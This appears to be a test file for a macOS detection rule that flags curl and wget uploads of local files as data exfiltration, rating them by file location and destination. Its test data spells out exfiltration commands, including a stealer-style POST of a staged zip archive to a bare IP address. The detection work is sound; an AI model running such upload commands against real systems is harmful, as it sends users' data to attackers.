import { describe, expect, test } from 'vitest';
import { analyze } from '../src/rules/engine';
import { apple, synth } from './synth';

// file-upload: curl or wget sending a local file to a server (an exfiltration step: staged data leaves the Mac).
const RULE = 'file-upload';
const curl = (cwd: string | null, ...args: string[]) => apple('/usr/bin/curl', ['curl', ...args], { cwd });
const wget = (...args: string[]) => apple('/usr/local/bin/wget', ['wget', ...args], { cwd: null });
const found = (i: ReturnType<typeof apple>) =>
  analyze(synth([i])).queue.flatMap(q => q.findings.filter(f => f.ruleId === RULE));
const sev = (i: ReturnType<typeof apple>) => found(i)[0]?.severity;

describe('file-upload', () => {
  test('AMOS: a staged archive posted to a bare IP address is high, T1041', () => {
    const f = found(curl(null, '-X', 'POST', '-H', 'buildid: efa8', '-H', 'username: pkbl2x41ld', '--data-binary', '@/tmp/lksopo.zip', 'http://85.193.68.244/log'));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.mitre).toEqual(['T1041']);
    expect(f[0]!.evidence).toContain('/tmp/lksopo.zip');
    expect(f[0]!.evidence).toContain('85.193.68.244');
  });

  test('an ordinary upload of an ordinary file to a named host is medium', () => {
    expect(sev(curl('/Users/u/work', '-T', '/Users/u/Documents/notes.txt', 'https://example.com/up'))).toBe('med');
    expect(sev(curl('/Users/u/work', '-F', 'file=@/Users/u/Documents/a.pdf', 'https://api.example.com/upload'))).toBe('med');
    expect(sev(curl('/Users/u/work', '--upload-file', '/Users/u/Documents/notes.txt', 'https://example.com/up'))).toBe('med');
  });

  test('the ways curl names a file to send: -T, -F, -d, --data-binary, --data-urlencode, --json', () => {
    const url = 'https://api.example.com/x';
    for (const args of [
      ['-T', '/tmp/a.json', url],
      ['-F', 'upload=@/tmp/a.json;type=application/json', url],
      ['-F', 'upload=</tmp/a.json', url],
      ['-d', '@/tmp/a.json', url],
      ['--data', '@/tmp/a.json', url],
      ['--data-binary', '@/tmp/a.json', url],
      ['--data-binary=@/tmp/a.json', url],
      ['--data-urlencode', '@/tmp/a.json', url],
      ['--data-urlencode', 'blob@/tmp/a.json', url],
      ['--json', '@/tmp/a.json', url],
      ['-sSLXPOST', '-d@/tmp/a.json', url],
    ]) expect(sev(curl(null, ...args)), args.join(' ')).toBe('high');   // a temporary folder
  });

  test('a file from a temporary, Downloads or hidden place, or an archive anywhere, makes it high', () => {
    const url = 'https://example.com/up';
    expect(sev(curl(null, '-T', '/Users/u/Downloads/a.txt', url))).toBe('high');
    expect(sev(curl(null, '-T', '/Users/u/Documents/.stash/a.txt', url))).toBe('high');   // a buried hidden folder
    expect(sev(curl(null, '-T', '/Users/u/.config/app/a.txt', url))).toBe('med');          // an app's folder directly in home is ordinary
    expect(sev(curl(null, '-T', '/Users/u/Documents/backup.zip', url))).toBe('high');
    expect(sev(curl(null, '-T', '/Users/u/Documents/dump.tar.gz', url))).toBe('high');
    expect(sev(curl(null, '-T', '/Users/u/Documents/a.txt', url))).toBe('med');
  });

  test('a bare IP address (v4 or v6) makes it high, whatever the file', () => {
    expect(sev(curl(null, '-T', '/Users/u/Documents/a.txt', 'http://203.0.113.7:8080/up'))).toBe('high');
    expect(sev(curl(null, '-T', '/Users/u/Documents/a.txt', 'http://[2001:db8::1]/up'))).toBe('high');
    expect(sev(curl(null, '-T', '/Users/u/Documents/a.txt', 'https://203.0.113.example.com/up'))).toBe('med');
  });

  test('a relative file counts through the working directory', () => {
    expect(sev(curl('/tmp/stage', '-T', 'loot.txt', 'https://example.com/up'))).toBe('high');
    expect(sev(curl('/Users/u/work', '-T', 'loot.txt', 'https://example.com/up'))).toBe('med');
  });

  test('wget --post-file and --body-file', () => {
    expect(sev(wget('--post-file=/tmp/a.zip', 'http://203.0.113.7/'))).toBe('high');
    expect(sev(wget('--body-file', '/Users/u/Documents/a.txt', '--method=PUT', 'https://example.com/up'))).toBe('med');
  });

  test('a destination on this Mac is ignored', () => {
    for (const url of ['http://localhost:3000/up', 'http://127.0.0.1:8080/up', 'http://[::1]/up', 'http://app.localhost/up']) {
      expect(found(curl(null, '-T', '/tmp/a.zip', url)), url).toHaveLength(0);
    }
  });

  test('not an upload: stdin, plain data, a download, no URL, another tool', () => {
    const url = 'https://example.com/x';
    expect(found(curl(null, '--data-binary', '@-', url))).toHaveLength(0);
    expect(found(curl(null, '-d', 'a=b&c=d', url))).toHaveLength(0);
    expect(found(curl(null, '--data-raw', '@/tmp/a.json', url))).toHaveLength(0);   // --data-raw never reads a file
    expect(found(curl(null, '-o', '/tmp/a.zip', url))).toHaveLength(0);
    expect(found(curl(null, '-T', '/tmp/a.zip'))).toHaveLength(0);
    expect(found(apple('/usr/bin/scp', ['scp', '/tmp/a.zip', 'user@203.0.113.7:/x'], { cwd: null }))).toHaveLength(0);
  });
});
